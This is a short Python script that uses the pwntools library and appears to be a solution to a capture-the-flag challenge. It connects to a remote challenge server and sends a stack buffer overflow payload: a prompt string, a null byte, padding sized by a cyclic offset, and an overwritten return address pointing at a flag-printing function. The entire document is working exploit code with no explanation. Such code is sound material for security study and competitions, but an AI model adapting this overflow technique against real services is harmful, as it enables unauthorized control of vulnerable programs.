import pwn
import sys
import warnings

warnings.filterwarnings(action='ignore', category=BytesWarning)


p=pwn.remote("lac.tf", 31180)
p.recvuntil(b"hi, how can i help?")

offset = pwn.cyclic_find("aoaa")
catflagaddr=0x40129a
p.sendline(b"give me the flag\x00"+b'1'*offset+pwn.p64(catflagaddr))
p.interactive()
